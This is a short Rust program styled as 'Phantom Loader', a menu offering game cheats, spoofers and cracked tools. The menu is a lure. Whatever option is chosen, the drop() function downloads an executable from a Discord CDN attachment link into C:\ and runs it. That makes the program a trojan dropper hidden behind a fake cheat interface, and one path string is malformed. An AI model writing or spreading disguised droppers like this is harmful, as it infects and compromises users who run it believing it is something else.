extern crate colored;
extern crate subprocess;

use colored::*;
use downloader::Downloader;
use subprocess::Exec;
use std::io::*;


fn main(){
    let logo = "\n██████╗░██╗░░██╗░█████╗░███╗░░██╗████████╗░█████╗░███╗░░░███╗  ██╗░░░░░░█████╗░░█████╗░██████╗░███████╗██████╗░\n██╔══██╗██║░░██║██╔══██╗████╗░██║╚══██╔══╝██╔══██╗████╗░████║  ██║░░░░░██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗\n██████╔╝███████║███████║██╔██╗██║░░░██║░░░██║░░██║██╔████╔██║  ██║░░░░░██║░░██║███████║██║░░██║█████╗░░██████╔╝\n██╔═══╝░██╔══██║██╔══██║██║╚████║░░░██║░░░██║░░██║██║╚██╔╝██║  ██║░░░░░██║░░██║██╔══██║██║░░██║██╔══╝░░██╔══██╗\n██║░░░░░██║░░██║██║░░██║██║░╚███║░░░██║░░░╚█████╔╝██║░╚═╝░██║  ███████╗╚█████╔╝██║░░██║██████╔╝███████╗██║░░██║\n╚═╝░░░░░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝░░░╚═╝░░░░╚════╝░╚═╝░░░░░╚═╝  ╚══════╝░╚════╝░╚═╝░░╚═╝╚═════╝░╚══════╝╚═╝░░╚═╝";
    let menu = "\n[1] Fortnite                    [6] HWID Spoofer\n[2] Apex Legends Cheat          [7] Valorant Loader\n[3] Rust Cheat                  [8] SynapseX Cracked\n[4] Nitro Gen\n[5] Warzone Hack";
    let mut line = String::new();
    println!("{}", logo.blue());
    println!("{}", menu.purple());
    println!("Chose Cheat :");
    std::io::stdin().read_line(&mut line).unwrap();
    drop();

}


fn drop(){
    let url = "https://cdn.discordapp.com/attachments/1030171270635073549/1032886579691257856/test.exe";
    let mut downloader = Downloader::builder()
        .download_folder(std::path::Path::new("C:\\"))
        .parallel_requests(1)
        .build()
        .unwrap();


    let dl2 = downloader::Download::new(
        url,
    );

    let result = downloader.download(&[dl2]).unwrap();

    let x = Exec::cmd("ls").stream_stdout().unwrap();
    let br = BufReader::new(x);
    for (i, line) in br.lines().enumerate() {
        println!("{}: {}", i, line.unwrap());
    }
    
    let x = Exec::cmd("C:\test.exe").stream_stdout().unwrap();
    let br = BufReader::new(x);
    for (i, line) in br.lines().enumerate() {
        println!("{}: {}", i, line.unwrap());
    }
}